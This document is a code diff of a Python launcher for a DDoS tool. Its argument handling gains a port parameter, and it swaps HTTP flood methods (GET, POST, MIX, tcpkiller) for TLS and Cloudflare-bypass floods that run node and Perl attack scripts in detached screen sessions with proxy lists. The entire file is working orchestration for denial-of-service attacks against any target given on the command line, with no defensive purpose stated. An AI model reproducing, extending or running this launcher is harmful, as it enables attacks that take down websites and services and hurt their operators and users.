@@ -5,33 +5,17 @@ from colorama import Fore
 
 method = sys.argv[1].upper()
 target = sys.argv[2]
-time = sys.argv[3]
+port = sys.argv[3]
+time = sys.argv[4]
 
-if method == "GET":
-    os.system(f"screen -dm node attack.js {target} {time} 75")
-elif method == "GET2":
-    os.system(f"screen -dm node http22.js {target} {time}")
-    os.system(f"screen -dm node http22.js {target} {time}")
-    os.system(f"screen -dm node http22.js {target} {time}")
-    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
-    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
-    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
-elif method == "POST":
-    os.system(f"screen -dm node http-p.js {target} {time} 500") 
-    os.system(f"screen -dm node http-p.js {target} {time} 500") 
-    os.system(f"screen -dm node http-p.js {target} {time} 500") 
-    os.system(f"screen -dm node http-p.js {target} {time} 500") 
-    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
-    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
-    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")  
-elif method == "MIX":
-    os.system(f"screen -dm node http-mix.js {target} {time} 500")
-    os.system(f"screen -dm node http-mix.js {target} {time} 500")
-    os.system(f"screen -dm node http-mix.js {target} {time} 500")
-    os.system(f"screen -dm node http-mix.js {target} {time} 500")
-    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
-    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
-    os.system(f"screen -dm node tcpkiller {target} 2.txt {time}")
+if method == "TLS-CF":
+    os.system(f"screen -dm node TLS-CF.js {target} {time} 64 10 http-checked.txt")
+elif method == "CF-TLS":
+    os.system(f"screen -dm node CF-TLS.js {target} {time} 10 http-checked.txt")
+elif method == "CF-L4":
+    os.system(f"screen -dm perl cloudflare.pl {target} {port} {time}") 
+elif method == "TLS-MIX":
+    os.system(f"screen -dm node tls-mix.js {target} {time} 64 10 http-checked.txt")
 elif method == "QUERY":
     os.system(f"screen -dm node http-query.js {target} {time} 500")
     os.system(f"screen -dm node http-query.js {target} {time} 500")
